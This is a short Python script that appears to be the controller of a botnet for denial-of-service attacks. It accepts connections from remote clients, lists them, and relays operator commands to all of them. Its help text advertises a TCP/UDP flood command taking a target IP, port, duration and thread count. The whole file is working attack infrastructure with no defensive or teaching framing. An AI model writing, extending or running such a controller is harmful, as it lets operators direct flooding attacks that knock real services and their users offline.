import socket
import threading
import time
help=r'''
attack <tcp/udp> <ip> <port> <time in second> <thread>
Options:
	ping      	To check server alive or not
	kill      	To stop all servers
	list 		Show online servers
'''
all_connections = []
all_address = []
def collect():
    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)
            all_connections.append(conn)
            all_address.append(address)
        except:
            print("Error accepting connections")
if __name__ == '__main__':
	host = "127.0.0.1"
	port = 9999
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((host, port))
	s.listen(50)
	threading.Thread(target=collect).start()
	while True:
		cmd=input("->>")
		if cmd:
			if cmd == "list":
				results = ''
				for i, conn in enumerate(all_connections):
					results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
				print("----Clients----" + "\n" + results)
			elif cmd=="help":
				print(help)
			else:
				c=0
				for n in all_connections:
					cmd=str(cmd)
					cmd=str.encode(cmd)
					n.send(cmd)
					print("[+] {} {}".format(all_address[c][0],n.recv(1024).decode("utf-8")))
		else:
			continue
